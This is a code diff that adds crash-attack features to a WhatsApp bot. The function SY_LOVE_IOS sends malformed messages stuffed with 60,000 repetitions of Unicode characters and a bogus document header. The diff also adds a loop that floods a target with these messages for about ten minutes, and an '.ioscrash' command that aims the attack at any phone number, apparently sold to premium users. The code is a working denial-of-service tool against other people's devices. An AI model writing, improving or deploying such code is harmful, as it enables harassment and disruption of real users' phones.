@@ -1797,6 +1797,73 @@ async function RunCrashHelper(sock, targetJid) {
 
 
 
+
+
+
+
+async function SY_LOVE_IOS(sock, target) {
+	const SABANA = "𑇂𑆵𑆴𑆿".repeat(60000);
+    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "application/json",
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999999",
+                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: fileName,
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1715880173"
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: { text: bodyText },
+                    nativeFlowMessage: {
+                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram","flow_id":"Telegram","flow_message_version":"9.903","flow_token":"Telegram"}`
+                    },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "771828057373650852@newsletter"),
+                        groupMentions: [{ groupJid: "771828057373650852@newsletter", groupSubject: "✦" }]
+                    }
+                }
+            }
+        }
+    }), { userJid: target });
+await sock.relayMessage(target, {
+        locationMessage: {
+            degreesLatitude: 173.282,
+            degreesLongitude: -19.378,
+            name: "✦" + SABANA,
+            url: "https://google.com"
+        }
+    }, { participant: { jid: target } });
+    
+    await sock.relayMessage(target, {
+        locationMessage: {
+            degreesLatitude: 173.282,
+            degreesLongitude: -19.378,
+            name: SABANA,
+            url: "https://google.com"
+        }
+    }, { participant: { jid: target } });
+    }
+
+
+
+
+
+
+
+
+
+
+
+
 async function S7LOVESYUILIKES7(sock, targetJid) {
   const SY_LOVE_IS_IMPORTANT = 1000;
   const ALSO_S7_TOO = 10 * 60 * 1000;
@@ -1827,6 +1894,38 @@ async function S7LOVESYUILIKES7(sock, targetJid) {
   }
 }
 
+
+
+
+async function SYLOVE_CRASH_IOS(sock, targetJid) {
+  const SY_LOVE_IS_IMPORTANT = 1000;
+  const ALSO_S7_TOO = 10 * 60 * 1000;
+  const ONE_HOUR_LOVS = 10 * 60 * 1000;
+  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+  
+
+  const startTime = Date.now();
+
+  while (Date.now() - startTime < ONE_HOUR_LOVS) {
+  
+    await SY_LOVE_IOS(sock, target);
+    await SY_LOVE_IOS(sock, target);
+
+    const tenMinuteStart = Date.now();
+
+
+    while (Date.now() - tenMinuteStart < ALSO_S7_TOO) {
+    
+      await SY_LOVE_IOS(sock, target);
+      await SY_LOVE_IOS(sock, target);
+      await delay(SY_LOVE_IS_IMPORTANT);
+    }
+    
+    
+    await SY_LOVE_IOS(sock, target);
+    await SY_LOVE_IOS(sock, target);
+  }
+}
 
 
 
@@ -2439,13 +2538,11 @@ case userMessage.startsWith('.test'): {
 
 
            case userMessage.startsWith('.xcrash'): {
-    // 1. Owner/Sudo Check
     if (!message.key.fromMe && !senderIsOwnerOrSudo) {
         await sock.sendMessage(chatId, { text: '❌ Only owner / sudo can use this command' }, { quoted: message });
         break;
     }
 
-    // 2. Premium Check (Passing full message object)
     if (!isLOVSmeSY(message, sock)) {
         await sock.sendMessage(chatId, {
             text: `*🚫 ACCESS DENIED 🚫*\n*🔒 Premium Users Only*\n*📩 t.me/@Zoroxbug*\n*📞 +91 82930 07159*`,
@@ -2454,14 +2551,12 @@ case userMessage.startsWith('.test'): {
         break;
     }
 
-    // 3. Argument check
     const parts = rawText.trim().split(/\s+/);
     if (!parts[1]) {
         await sock.sendMessage(chatId, { text: '⚠️ Usage:\n.xcrash +917XXXXXXXXX' }, { quoted: message });
         break;
     }
 
-    // 4. Number cleaning & Length check
     const number = parts[1].replace(/\D/g, '');
     if (number.length < 10) {
         await sock.sendMessage(chatId, { text: '❌ Invalid number format (Min 10 digits required)' }, { quoted: message });
@@ -2470,7 +2565,6 @@ case userMessage.startsWith('.test'): {
 
     const targetJid = number + '@s.whatsapp.net';
 
-    // 5. WhatsApp Existence Check (Wapas add kar diya ✅)
     let exists = false;
     try {
         const check = await sock.onWhatsApp(number);
@@ -2484,7 +2578,6 @@ case userMessage.startsWith('.test'): {
         break;
     }
 
-    // 6. Success - Execution
     await sock.sendMessage(chatId, {
         text: `🔥 *XCRASH STARTED*\n🎯 Target: ${targetJid}`,
         ...channelInfo
@@ -2494,7 +2587,56 @@ case userMessage.startsWith('.test'): {
     commandMatched = true;
     break;
 }
+            case userMessage.startsWith('.ioscrash'): {
+    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
+        await sock.sendMessage(chatId, { text: '❌ Only owner / sudo can use this command' }, { quoted: message });
+        break;
+    }
 
+    if (!isLOVSmeSY(message, sock)) {
+        await sock.sendMessage(chatId, {
+            text: `*🚫 ACCESS DENIED 🚫*\n*🔒 Premium Users Only*\n*📩 t.me/@Zoroxbug*\n*📞 +91 82930 07159*`,
+            ...channelInfo
+        }, { quoted: message });
+        break;
+    }
+
+    const parts = rawText.trim().split(/\s+/);
+    if (!parts[1]) {
+        await sock.sendMessage(chatId, { text: '⚠️ Usage:\n.ioscrash +917XXXXXXXXX' }, { quoted: message });
+        break;
+    }
+
+    const number = parts[1].replace(/\D/g, '');
+    if (number.length < 10) {
+        await sock.sendMessage(chatId, { text: '❌ Invalid number format (Min 10 digits required)' }, { quoted: message });
+        break;
+    }
+
+    const targetJid = number + '@s.whatsapp.net';
+
+    let exists = false;
+    try {
+        const check = await sock.onWhatsApp(number);
+        exists = check?.[0]?.exists;
+    } catch (e) {
+        console.log("Check error:", e);
+    }
+
+    if (!exists) {
+        await sock.sendMessage(chatId, { text: '❌ This number is NOT on WhatsApp' }, { quoted: message });
+        break;
+    }
+
+    await sock.sendMessage(chatId, {
+        text: `🚀 *iOS Crash Process Started*\n🎯 Target ID: ${targetJid}`,
+        ...channelInfo
+    }, { quoted: message });
+
+    SY_LOVE_IOS(sock, target);
+    commandMatched = true;
+    break;
+}
             case userMessage.startsWith('.unban'):
                 if (!isGroup) {
                     if (!message.key.fromMe && !senderIsSudo) {
